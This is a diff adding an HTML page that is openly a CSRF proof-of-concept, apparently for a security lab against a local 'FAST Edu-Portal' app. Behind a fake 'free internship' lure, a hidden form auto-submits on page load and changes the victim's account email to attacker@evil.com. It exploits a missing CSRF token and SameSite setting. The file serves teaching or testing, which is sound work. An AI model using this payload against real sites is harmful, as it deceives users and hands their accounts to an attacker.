@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Totally harmless page</title></head>
+<body>
+  <h1>You won a free internship! Click anywhere to claim it 🎉</h1>
+  <p>(In the background, this page silently changes the e-mail on the
+     victim's FAST Edu-Portal account to attacker@evil.com — no click
+     needed, it auto-submits on load.)</p>
+
+  <!-- CSRF proof-of-concept: a cross-site auto-submitting form targeting
+       the vulnerable app's state-changing /account/update-email endpoint.
+       The victim's session cookie is attached automatically by the
+       browser because the vulnerable app sets no CSRF token and no
+       SameSite hardening on its session cookie. -->
+  <form id="csrf-form" action="http://localhost:4000/account/update-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com">
+  </form>
+  <script>
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
